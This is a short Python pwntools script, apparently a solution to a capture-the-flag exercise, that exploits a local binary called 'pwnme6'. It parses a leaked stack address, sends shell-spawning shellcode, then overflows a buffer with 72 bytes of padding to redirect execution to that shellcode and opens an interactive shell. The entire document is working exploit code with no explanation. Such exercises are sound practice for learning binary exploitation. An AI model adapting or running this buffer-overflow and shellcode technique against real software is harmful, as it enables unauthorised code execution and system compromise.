from pwn import *

context.arch = 'amd64'

p = process('./pwnme6')

line        = p.recvline()
shellcode_addr = int(line.split(b': ')[1].strip(), 16)
log.info(f"Shellcode will be at: {hex(shellcode_addr)}")

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)

payload  = b'A' * 72
payload += p64(shellcode_addr)
p.sendline(payload)

p.interactive()
